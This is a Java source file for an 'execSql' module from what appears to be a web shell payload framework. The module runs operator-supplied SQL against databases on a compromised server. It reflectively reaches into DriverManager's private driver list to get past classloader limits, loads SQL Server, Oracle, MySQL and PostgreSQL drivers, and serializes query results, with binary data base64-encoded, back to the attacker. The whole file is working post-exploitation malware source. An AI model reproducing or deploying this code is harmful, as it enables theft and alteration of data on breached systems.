package shells.payloads.java.modules;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Properties;

public class ExecSqlModule {
    public static final char[] toBase64 = new char[]{'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
    private Map session;
    private Object servletRequest;

    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[])value);
        }
        return value != null ? value.toString() : null;
    }

    private byte[] getBytes(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        return value instanceof byte[] ? (byte[])value : null;
    }

    private static byte[] intToBytes(int value) {
        return new byte[]{(byte)(value & 255), (byte)(value >> 8 & 255), (byte)(value >> 16 & 255), (byte)(value >> 24 & 255)};
    }

    private byte[] serialize(Map map) {
        java.util.Iterator keys = map.keySet().iterator();
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

        while(keys.hasNext()) {
            try {
                String key = (String)keys.next();
                Object v = map.get(key);
                outputStream.write(key.getBytes());
                byte[] vb;
                if (v instanceof byte[]) {
                    outputStream.write(2);
                    vb = (byte[])v;
                } else if (v instanceof Map) {
                    outputStream.write(1);
                    vb = this.serialize((Map)v);
                } else {
                    outputStream.write(2);
                    vb = v == null ? "NULL".getBytes() : v.toString().getBytes();
                }

                outputStream.write(intToBytes(vb.length));
                outputStream.write(vb);
            } catch (Exception ignored) {
            }
        }

        return outputStream.toByteArray();
    }

    private static Connection getConnection(String jdbcUrl, String user, String password) {
        Connection connection = null;

        try {
            Class driverManagerClass = Class.forName("java.sql.DriverManager");
            Field[] fields = driverManagerClass.getDeclaredFields();
            Field driversField = null;

            for(int i = 0; i < fields.length; ++i) {
                Field f = fields[i];
                if (f.getName().indexOf("rivers") != -1 && List.class.isAssignableFrom(f.getType())) {
                    driversField = f;
                    break;
                }
            }

            if (driversField != null) {
                driversField.setAccessible(true);
                List drivers = (List)driversField.get((Object)null);
                Iterator it = drivers.iterator();

                while(it.hasNext() && connection == null) {
                    try {
                        Object driverInfo = it.next();
                        Driver driver = null;
                        if (!(driverInfo instanceof Driver)) {
                            Field[] infoFields = driverInfo.getClass().getDeclaredFields();

                            for(int j = 0; j < infoFields.length; ++j) {
                                Field df = infoFields[j];
                                if (Driver.class.isAssignableFrom(df.getType())) {
                                    df.setAccessible(true);
                                    driver = (Driver)df.get(driverInfo);
                                    break;
                                }
                            }
                        } else {
                            driver = (Driver)driverInfo;
                        }

                        if (driver != null) {
                            Properties props = new Properties();
                            if (user != null) {
                                props.put("user", user);
                            }

                            if (password != null) {
                                props.put("password", password);
                            }

                            connection = driver.connect(jdbcUrl, props);
                        }
                    } catch (Exception ignored) {
                    }
                }
            }
        } catch (Exception ignored) {
        }

        return connection;
    }

    private String base64Encode(byte[] data) {
        byte start = 0;
        int end = data.length;
        byte[] out = new byte[4 * ((data.length + 2) / 3)];
        byte lineLen = -1;
        boolean doPadding = true;
        char[] base64 = toBase64;
        int sp = start;
        int slen = (end - start) / 3 * 3;
        int sl = start + slen;
        if (lineLen > 0 && slen > lineLen / 4 * 3) {
            slen = lineLen / 4 * 3;
        }

        int dp = 0;

        int sp0;
        int sp1;
        for(sp0 = 0; sp < sl; sp = sp1) {
            sp1 = Math.min(sp + slen, sl);
            int sp2 = sp;

            int bits;
            for(int dp0 = dp; sp2 < sp1; out[dp0++] = (byte)base64[bits & 63]) {
                bits = (data[sp2++] & 255) << 16 | (data[sp2++] & 255) << 8 | data[sp2++] & 255;
                out[dp0++] = (byte)base64[bits >>> 18 & 63];
                out[dp0++] = (byte)base64[bits >>> 12 & 63];
                out[dp0++] = (byte)base64[bits >>> 6 & 63];
            }

            sp2 = (sp1 - sp) / 3 * 4;
            dp += sp2;
        }

        if (sp < end) {
            sp0 = data[sp++] & 255;
            out[dp++] = (byte)base64[sp0 >> 2];
            if (sp == end) {
                out[dp++] = (byte)base64[sp0 << 4 & 63];
                if (doPadding) {
                    out[dp++] = 61;
                    out[dp++] = 61;
                }
            } else {
                sp1 = data[sp++] & 255;
                out[dp++] = (byte)base64[sp0 << 4 & 63 | sp1 >> 4];
                out[dp++] = (byte)base64[sp1 << 2 & 63];
                if (doPadding) {
                    out[dp++] = 61;
                }
            }
        }

        return new String(out);
    }

    public void setSession(Map session) {
        this.session = session;
    }

    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }

    public byte[] execute() {
        try {
            String dbCharset = this.getString("dbCharset");
            String jdbcURL = this.getString("jdbcURL");
            String dbDriver = this.getString("dbDriver");
            String dbUsername = this.getString("dbUsername");
            String dbPassword = this.getString("dbPassword");
            String execType = this.getString("execType");
            if (dbCharset == null || dbCharset.trim().length() > 0) {
                dbCharset = "UTF-8";
            }

            byte[] execSqlBytes = this.getBytes("execSql");
            String sql = execSqlBytes == null ? null : new String(execSqlBytes, dbCharset);
            HashMap result = new HashMap();
            if (dbUsername != null && dbPassword != null && execType != null && sql != null) {
                try {
                    try {
                        if (dbDriver != null) {
                            Class.forName(dbDriver);
                        }
                    } catch (Throwable ignored) {
                    }

                    try {
                        Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
                    } catch (Throwable ignored) {
                    }

                    try {
                        Class.forName("oracle.jdbc.driver.OracleDriver");
                    } catch (Throwable ignored) {
                        try {
                            Class.forName("oracle.jdbc.OracleDriver");
                        } catch (Throwable ignored2) {
                        }
                    }

                    try {
                        Class.forName("com.mysql.cj.jdbc.Driver");
                    } catch (Throwable ignored) {
                        try {
                            Class.forName("com.mysql.jdbc.Driver");
                        } catch (Throwable ignored2) {
                        }
                    }

                    try {
                        Class.forName("org.postgresql.Driver");
                    } catch (Throwable ignored) {
                    }

                    if (jdbcURL != null) {
                        try {
                            Connection conn = null;

                            try {
                                conn = getConnection(jdbcURL, dbUsername, dbPassword);
                            } catch (Exception ignored) {
                            }

                            if (conn == null) {
                                conn = DriverManager.getConnection(jdbcURL, dbUsername, dbPassword);
                            }

                            Statement stmt = conn.createStatement();
                            if (execType.equals("select")) {
                                ResultSet rs = stmt.executeQuery(sql);
                                ResultSetMetaData meta = rs.getMetaData();
                                int columnCount = meta.getColumnCount();
                                HashMap columns = new HashMap();

                                for(int i = 0; i < columnCount; ++i) {
                                    columns.put(String.valueOf(i), meta.getColumnName(i + 1));
                                }

                                columns.put("count", String.valueOf(columnCount));
                                result.put("column", columns);
                                HashMap rows = new HashMap();
                                int rowCount = 0;

                                for(int rowIndex = 0; rs.next(); ++rowIndex) {
                                    HashMap row = new HashMap();

                                    for(int col = 0; col < columnCount; ++col) {
                                        Object v = rs.getObject(col + 1);
                                        String s;
                                        if (v == null) {
                                            s = "NULL";
                                        } else if (v instanceof byte[]) {
                                            s = this.base64Encode((byte[])v);
                                        } else {
                                            s = v.toString();
                                        }

                                        row.put(String.valueOf(col), s);
                                    }

                                    ++rowCount;
                                    rows.put(String.valueOf(rowIndex), row);
                                }

                                rows.put("count", String.valueOf(rowCount));
                                result.put("rows", rows);
                                rs.close();
                                stmt.close();
                                conn.close();
                            } else {
                                int updateCount = stmt.executeUpdate(sql);
                                stmt.close();
                                conn.close();
                                result.put("errMsg", "Query OK, " + updateCount + " rows affected");
                            }
                        } catch (Exception e) {
                            result.put("errMsg", e.getMessage());
                        }
                    } else {
                        result.put("errMsg", "This database is not supported");
                    }
                } catch (Exception e) {
                    result.put("errMsg", e.getMessage());
                }
            } else {
                result.put("errMsg", "No parameter dbType,dbHost,dbPort,dbUsername,dbPassword,execType,execSql");
            }

            return this.serialize(result);
        } catch (Exception e) {
            return ("Error: " + e.getMessage()).getBytes();
        }
    }

    public String getModuleName() {
        return "execSql";
    }
}
